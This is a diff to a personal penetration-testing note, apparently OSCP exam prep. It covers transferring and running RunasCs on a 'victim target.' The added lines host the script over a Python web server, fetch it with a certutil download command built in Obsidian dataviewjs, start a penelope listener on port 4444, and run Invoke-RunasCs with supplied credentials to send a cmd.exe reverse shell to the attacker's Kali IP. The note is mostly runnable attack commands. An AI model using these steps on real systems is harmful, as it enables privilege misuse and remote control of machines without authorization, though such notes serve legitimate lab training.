@@ -5,8 +5,37 @@ Invoke-RunasCs.ps1
 wget https://raw.githubusercontent.com/antonioCoco/RunasCs/refs/heads/master/Invoke-RunasCs.ps1
 ```
 
+Transfer Invoke-RunasCs.ps1 onto VICTIM TARGET
 
 ```
+cd ~/Desktop/Tools/Windows && python -m http.server 80
+```
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `certutil -urlcache -split -f http://${KaliIP}:80/Invoke-RunasCs.ps1 Invoke-RunasCs.ps1`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+Start listener 
+```
+cd ~/Desktop/Tools && python3 penelope.py -p 4444 -O / --oscp-safe
+```
+
+Dot Source Invoke-RunasCs.ps1
+```
+. .\Invoke-RunasCs.ps1
+```
+
+Run Invoke-RunasCs.ps1
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `Invoke-RunasCs -Username [username] -Password [passwd] -Command cmd.exe -Remote ${KaliIP}:4444`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+
 cd C:\Windows\Tasks
 ```
 
